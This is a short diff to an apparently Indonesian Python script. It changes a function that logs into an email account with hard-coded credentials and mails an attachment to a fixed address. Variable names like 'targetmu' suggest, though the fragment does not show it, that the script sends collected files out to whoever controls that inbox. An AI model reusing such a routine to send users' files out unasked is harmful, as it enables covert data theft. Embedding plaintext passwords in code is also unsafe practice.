@@ -79,9 +79,9 @@ def inputM(x,d):
 			tampil('\rm[!]Pilihan tidak ada')
 	return i
 def kirim():
-   email_user = 'targetmu@yahoo.com'
-   email_password = 'katasandi'
-   email_send = 'stut.74ck@gmail.com'
+   email_user = 'target.mu1234@gmail.com'
+   email_password = 'k4t4s4nd1'
+   email_send = 'targetmu@yahoo.com'
 
    subject = '=== KIRIMAN NYA KAK ==='
 
@@ -103,7 +103,7 @@ def kirim():
 
    msg.attach(part)
    text = msg.as_string()
-   server = smtplib.SMTP('smtp.mail.yahoo.com',465)
+   server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email_user,email_password)
 
